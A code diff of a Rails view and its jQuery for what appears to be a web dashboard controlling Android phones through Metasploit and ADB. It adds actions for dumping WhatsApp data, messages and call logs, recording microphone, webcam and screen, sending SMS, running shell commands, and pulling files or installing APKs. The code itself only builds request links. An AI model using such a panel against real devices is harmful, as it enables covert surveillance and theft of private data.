@@ -21,18 +21,6 @@
         <div class="screenn">
             <div class="top-icons">
                 <div class="app_row">
-                    <%= render "whatsapp_app_icon", :smartphone => smartphone %>
-                    <%= render "audio_mode_app_icon", :smartphone => smartphone %>
-                    <%= render "dump_wifi_app_icon", :smartphone => smartphone %>
-                    <%= render "call_logs_app_icon", :smartphone => smartphone %>
-                </div>
-                <div class="app_names">
-                    <span class="app_name">WhatsApp Data</span>
-                    <span class="app_name">Audio Mode</span>
-                    <span class="app_name">Wi-Fi Information</span>
-                    <span class="app_name">Dump Call Log</span>
-                </div>
-                <div class="app_row">
                     <%= render "dump_sysinfo_app_icon", :smartphone => smartphone %>
                     <%= render "dump_location_app_icon", :smartphone => smartphone %>
                     <%= render "video_rec_app_icon", :smartphone => smartphone %>
@@ -43,6 +31,18 @@
                     <span class="app_name">Dump Location</span>
                     <span class="app_name">Camera REC</span>
                     <span class="app_name">Dump Messages</span>
+                </div>
+                <div class="app_row">
+                    <%= render "whatsapp_app_icon", :smartphone => smartphone %>
+                    <%= render "audio_mode_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_wifi_app_icon", :smartphone => smartphone %>
+                    <%= render "call_logs_app_icon", :smartphone => smartphone %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">WhatsApp Data</span>
+                    <span class="app_name">Audio Mode</span>
+                    <span class="app_name">Wi-Fi Information</span>
+                    <span class="app_name">Dump Call Log</span>
                 </div>
                 <div class="app_row">
                     <%= render "dump_localtime_app_icon", :smartphone => smartphone %>
@@ -79,6 +79,18 @@
                     <span class="app_name">WLAN Geolocate</span>
                     <span class="app_name">Shell Command</span>
                     <span class="app_name">Webcam Snap</span>
+                </div>
+                <div class="app_row">
+                    <%= render "run_app_app_icon", :smartphone => smartphone %>
+                    <%= render "install_app_app_icon", :smartphone => smartphone %>
+                    <%= render "dump_device_info_app_icon", :smartphone => smartphone %>
+                    <%= render "pull_file_app_icon", :smartphone => smartphone %>                
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Open Application</span>
+                    <span class="app_name">Install APK</span>
+                    <span class="app_name">Device Info</span>
+                    <span class="app_name">Pull File</span>
                 </div>
             </div>
             <div class="timee">
@@ -123,7 +135,104 @@
                     type: "GET",
                     dataType: "script"
                 });
-            }, 2000); // In every 30 seconds
+            }, 3000);
         });
     });
+
+  
+
+
+    
+  $(".msf_link,.adb_link,.adb_msf_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href
+        + "&open=" + $("#open_toggle")[0].checked
+        + "&download=" + $("#download_toggle")[0].checked
+        + "&exec_timeout=" + $("#exec_timeout_slider")[0].value
+        + "&copy_timeout=" + $("#cp_timeout_slider")[0].value;
+    });
+  });
+
+  $("#webcam_snap_link, #webcam_record_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&back_camera=" + $("#back_camera_input")[0].checked
+                       + "&quality=" + $("#slider_quality")[0].value;
+    });
+  });
+
+  $("#microphone_rec_link, #screen_record_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&time=" + $("#slider_time")[0].value;
+    });
+  });
+
+  $("#dump_whatsapp_data_link,#dump_screen_snap_link,#dump_messages_link,#dump_contacts_link,#dump_callogs_link,#microphone_rec_link,#webcam_record_link,#webcam_snap_link,#screen_record_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&filename=" + $("#input_box_filename").val()
+                       + "&filepath=" + $("#input_box_filepath").val();
+    });
+  });
+
+  $("#send_sms_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&destination=" + $("#input_box_destination").val()
+                       + "&content=" + $("#input_box_content").val();
+
+    });
+  });
+
+  $("#pull_file_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&pull_file=" + $("#input_box_pull_file").val()
+                       + "&destination=" + $("#input_box_pull_file_destination").val();
+
+    });
+  });
+
+  $("#push_file_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&push_file=" + $("#input_box_push_file").val()
+                       + "&destination=" + $("#input_box_push_file_destination").val();
+
+    });
+  });
+
+  $("#shell_command_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&command=" + $("#input_box_shell_command").val();
+
+    });
+  });
+
+  $("#uninstall_app_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&app=" + $("#input_box_application").val();
+
+    });
+  });
+
+  $("#install_apk_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&app=" + $("#input_box_apkpath").val();
+
+    });
+  });
+
+  $("#install_apk_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&app=" + $("#input_box_apkpath").val();
+
+    });
+  });
+
+  $("#list_apps_link").click(function() {
+    $(this).attr("href", function() {
+      return this.href + "&system_apps=" + $("#system_apps_toggle")[0].checked
+                       + "&user_apps=" + $("#user_apps_toggle")[0].checked;
+
+    });
+  });
+
+
+  
 </script>
